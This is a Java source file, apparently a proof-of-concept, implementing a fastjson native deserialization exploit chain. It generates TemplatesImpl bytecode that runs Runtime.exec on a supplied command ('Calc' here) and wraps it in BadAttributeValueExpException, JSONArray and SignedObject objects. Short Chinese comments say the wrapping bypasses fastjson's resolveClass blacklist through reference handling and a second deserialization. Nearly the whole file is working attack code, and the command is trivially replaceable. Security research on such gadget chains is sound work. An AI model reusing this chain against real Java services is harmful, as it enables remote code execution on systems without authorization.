package fastjsonNative;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.List;

public class FJ2 {
    public static byte[] genPayload(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        List<Object> list = new ArrayList<>();
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{genPayload("Calc")});
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);

        list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测

        JSONArray jsonArray2 = new JSONArray();
        jsonArray2.add(templates);           //此时在handles这个hash表中查到了映射，后续则会以引用形式输出

        BadAttributeValueExpException bd2 = new BadAttributeValueExpException(null);
        setValue(bd2, "val", jsonArray2);

        list.add(bd2);

        //二次反序列化
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject((Serializable) list, kp.getPrivate(), Signature.getInstance("DSA"));

        //触发SignedObject#getObject
        JSONArray jsonArray1 = new JSONArray();
        jsonArray1.add(signedObject);

        BadAttributeValueExpException bd1 = new BadAttributeValueExpException(null);
        setValue(bd1, "val", jsonArray1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(bd1);
        objectOutputStream.close();
//
        ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));  //再套一层inputstream检查TemplatesImpl，不可用
        ois.readObject();

    }
}